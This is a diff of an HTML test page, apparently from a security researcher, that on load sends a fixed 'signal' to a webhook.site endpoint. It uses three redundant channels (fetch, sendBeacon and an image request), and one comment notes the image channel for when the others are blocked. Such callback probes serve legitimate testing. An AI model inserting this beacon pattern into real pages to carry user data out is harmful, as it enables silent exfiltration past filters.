@@ -1,39 +1,31 @@
 <!DOCTYPE html>
 <html>
-<head><title>Audit System - Firman Sahidin</title></head>
-<body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
-    <h1>[ FIRMAN SAHIDIN - SECURITY AUDIT ]</h1>
-    <h2 id="status">STATUS: INITIALIZING...</h2>
-
+<head><title>Final Bridge Test - Firman Sahidin</title></head>
+<body style="background:#111; color:#0f0; font-family:monospace; padding:40px; text-align:center;">
+    <h1 id="status">INITIATING SIGNAL...</h1>
     <script>
-        // URL WEBHOOK MANG FIRMAN
         const WEBHOOK = 'https://webhook.site/9326deec-1e36-4aa3-8945-3efe41a641e5';
+        
+        async function trigger() {
+            const data = JSON.stringify({
+                status: "BRIDGE_SUCCESS",
+                researcher: "Firman Sahidin",
+                note: "Jalur kabel aman, Mang!"
+            });
 
-        async function kirimData() {
             try {
-                const payload = JSON.stringify({
-                    status: "SUCCESS_CONNECTED",
-                    researcher: "Firman Sahidin",
-                    msg: "Jalur Aman Mang!"
-                });
-
-                // Jalur 1: Fetch
-                fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: payload });
-
-                // Jalur 2: Beacon
-                navigator.sendBeacon(WEBHOOK, payload);
-
-                // Jalur 3: Image (Paling Ampuh mun diblokir)
+                // Triple-Shoot
+                fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: data });
+                navigator.sendBeacon(WEBHOOK, data);
                 const img = new Image();
-                img.src = WEBHOOK + "?data=TEST_IMAGE_BONE";
+                img.src = WEBHOOK + "?log=IMG_BEACON_ACTIVE";
 
-                document.getElementById('status').innerText = "STATUS: ✅ SIGNAL SENT TO WEBHOOK!";
+                document.getElementById('status').innerText = "✅ SIGNAL SENT! CHECK WEBHOOK!";
             } catch (e) {
-                document.getElementById('status').innerText = "STATUS: ❌ ERROR: " + e.message;
+                document.getElementById('status').innerText = "❌ ERROR: " + e.message;
             }
         }
-
-        window.onload = kirimData;
+        window.onload = trigger;
     </script>
 </body>
 </html>
